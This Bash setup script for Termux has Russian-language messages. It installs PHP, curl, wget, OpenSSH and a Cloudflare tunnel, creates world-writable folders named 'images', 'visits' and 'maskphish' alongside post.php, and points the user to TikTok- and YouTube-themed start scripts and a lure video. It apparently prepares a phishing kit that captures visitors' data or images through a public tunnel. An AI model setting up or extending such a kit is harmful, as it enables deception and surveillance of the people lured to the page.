#!/bin/bash
clear
echo -e "\e[1;33m[!] НАЧИНАЮ УСТАНОВКУ ВСЕХ КОМПОНЕНТОВ (ДРОВ)...\e[0m"

# 1. Обновляем пакеты
echo -e "\e[1;34m[*] Обновление репозиториев...\e[0m"
pkg update -y && pkg upgrade -y

# 2. Установка необходимых инструментов
echo -e "\e[1;34m[*] Установка PHP, Git, Curl, wget, OpenSSH...\e[0m"
pkg install php git curl wget openssh -y

# 3. Установка Cloudflared (если еще нет)
if [ ! -f "$PREFIX/bin/cloudflared" ]; then
    echo -e "\e[1;34m[*] Установка Cloudflared туннеля...\e[0m"
    case $(uname -m) in
        aarch64) ARCH="arm64" ;;
        armv7l) ARCH="arm" ;;
        x86_64) ARCH="amd64" ;;
        *) ARCH="386" ;;
    esac
    wget "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-android-$ARCH" -O $PREFIX/bin/cloudflared
    chmod +x $PREFIX/bin/cloudflared
fi

# 4. Настройка папок и прав
echo -e "\e[1;34m[*] Настройка прав доступа и директорий...\e[0m"
mkdir -p images visits maskphish
chmod -R 777 images visits maskphish post.php start_tt.sh start_yt.sh corpse.sh

# 5. Проверка видео
if [ ! -f "video.mp4" ]; then
    echo -e "\e[1;31m[!] ВНИМАНИЕ: Файл video.mp4 не найден! Не забудь загрузить его.\e[0m"
else
    echo -e "\e[1;32m[+] Видео обнаружено.\e[0m"
fi

echo -e "\n\e[1;32m[OK] ВСЕ ДРОВА УСТАНОВЛЕНЫ И НАСТРОЕНЫ!\e[0m"
echo -e "\e[1;36mТеперь можешь запускать ./start_tt.sh или ./start_yt.sh\e[0m"
